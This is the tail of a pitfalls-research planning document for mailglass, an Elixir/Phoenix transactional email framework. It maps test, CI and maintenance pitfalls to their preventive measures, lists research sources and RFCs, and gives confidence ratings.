| TEST-03 (property tests too late) | v0.1 — Test pyramid (gate) | StreamData on signing/idempotency/headers from v0.1 |
| TEST-04 (untested doctests) | v0.1 — doc-contract tests | `test/mailglass/docs_contract_test.exs`; `verify.docs_contract` |
| TEST-05 (no Ecto sandbox) | v0.1 — Test infrastructure | `Mailglass.MailerCase` template includes sandbox |
| TEST-06 (time-dependent tests) | v0.1 — Clock module | `Mailglass.Clock`; Fake adapter time-advance helpers |
| CI-01 (matrix too wide) | v0.1 — CI/CD | Required matrix ≤2 cells; nightly wider matrix |
| CI-02 (actions not SHA-pinned) | v0.1 — CI/CD | All `uses:` SHA-pinned; Dependabot for github-actions; actionlint |
| CI-03 (secrets exposed) | v0.1 — CI/CD | GitHub Environment secrets; `permissions: contents: read` default |
| CI-04 (docs not gated) | v0.1 — CI/CD | `mix docs --warnings-as-errors`; doc-contract tests |
| CI-05 (`hex.audit` not run) | v0.1 — CI/CD | `mix hex.audit` in lint lane |
| CI-06 (no `--no-optional-deps`) | v0.1 — CI/CD | Lane runs `mix compile --no-optional-deps --warnings-as-errors` |
| MAINT-01 (scope creep) | Continuous | PROJECT.md Out of Scope citations on every issue; quarterly review |
| MAINT-02 (bus factor) | Continuous | MAINTAINING.md complete; coastable v0.1; co-maintainer recruitment by v0.5 |
| MAINT-03 (compliance churn) | Continuous | 20-30% time budget documented; provider release-note subscriptions; quarterly `mail.doctor` |
| MAINT-04 (breaking changes batched) | v0.1 — `api_stability.md` | NimbleOptions deprecation cycle; `:since`/`:deprecated` annotations |
| MAINT-05 (Discord replaces issues) | v0.1 — `CONTRIBUTING.md` | Channel policy documented; pinned redirect message |

---

## Sources

**Primary (grounded in `prompts/` corpus):**
- `prompts/mailglass-engineering-dna-from-prior-libs.md` — convergent DNA from accrue, lattice_stripe, sigra, scrypath; explicit "Things NOT to do" gotchas (§6 items 1-17)
- `prompts/Phoenix needs an email framework not another mailer.md` — failure modes section (§8); deliverability MUSTs (§4); canonical webhook taxonomy (§5)
- `prompts/elixir-opensource-libs-best-practices-deep-research.md` — explicit anti-patterns (§17); use/macro pitfalls (§6); compile-time deps (§2)
- `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md` — CI anti-patterns; supply-chain practices; release security
- `prompts/mailer-domain-language-deep-research.md` — terms to avoid (§16); SuppressionScope/SuppressionReason canonical sets (§8); bounce vs deferred distinction (§14)
- `.planning/PROJECT.md` — locked decisions (D-01 through D-20) reflect prevention strategies; constraints section enumerates compliance/security MUSTs
- `prompts/mailglass-brand-book.md` — referenced for voice on error messages (specific, never "Oops!")

**Secondary (RFCs and field knowledge):**
- RFC 7208 §4.6.4 (SPF 10-lookup limit)
- RFC 6376 §6.1.2 (DKIM key rotation, dual-publish window)
- RFC 8058 (one-click unsubscribe POST)
- 2024 Gmail/Yahoo bulk-sender rules; Nov 2025 Gmail 550 escalation
- GDPR / ePrivacy on tracking pixels and click rewriting
- Phoenix/Ecto sandbox best practices (community)

**Confidence calibration:**
- HIGH confidence on all gotchas grounded in 4-of-4 prior-lib convergence (engineering DNA §2.X)
- HIGH confidence on all email-domain pitfalls grounded in compliance MUSTs research
- MEDIUM confidence on field-knowledge supplements (TEST-05, TEST-06, MAINT-05) — well-established Elixir/Phoenix patterns but not explicitly cited in `prompts/`
- The pitfall list is opinionated and curated to mailglass's specific design; generic SaaS/web pitfalls are intentionally excluded

---
*Pitfalls research for: mailglass — Phoenix-native transactional email framework*
*Researched: 2026-04-21*
